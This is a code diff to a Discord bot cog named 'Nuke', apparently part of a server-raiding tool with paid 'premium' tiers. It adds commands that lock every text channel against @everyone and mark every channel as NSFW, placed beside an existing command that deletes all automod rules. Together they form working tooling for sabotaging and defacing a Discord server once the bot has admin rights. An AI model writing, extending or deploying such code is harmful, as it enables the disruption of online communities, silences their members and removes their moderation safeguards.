@@ -123,6 +123,41 @@ class Nuke(commands.Cog):
     @blacklisted_command()
     @premium_cooldown(1, 30)
     @commands.command(
+        name="lock_all",
+        aliases=["lockall", "lock"],
+        help="Lock all channels by denying @everyone send messages")
+    async def lock_all(self, ctx: commands.Context):
+        guild = ctx.guild
+        everyone_role = guild.default_role
+        locked = 0
+        for channel in guild.text_channels:
+            try:
+                await channel.set_permissions(everyone_role, send_messages=False)
+                locked += 1
+            except Exception as e:
+                print(f"Failed to lock channel {channel.id}: {e}")
+        await ctx.send(f"Locked {locked} channels.")
+
+    @blacklisted_command()
+    @premium_cooldown(1, 30)
+    @commands.command(
+        name="nsfw_all",
+        aliases=["nsfwall", "nsfw"],
+        help="Mark all channels as NSFW")
+    async def nsfw_all(self, ctx: commands.Context):
+        guild = ctx.guild
+        changed = 0
+        for channel in guild.text_channels:
+            try:
+                await channel.edit(nsfw=True)
+                changed += 1
+            except Exception as e:
+                print(f"Failed to mark channel {channel.id} as NSFW: {e}")
+        await ctx.send(f"Marked {changed} channels as NSFW.")
+
+    @blacklisted_command()
+    @premium_cooldown(1, 30)
+    @commands.command(
         name="delete_automod",
         aliases=["da", "deleteautomod", "delautomod"],
         help="Delete all automod rules in the server")
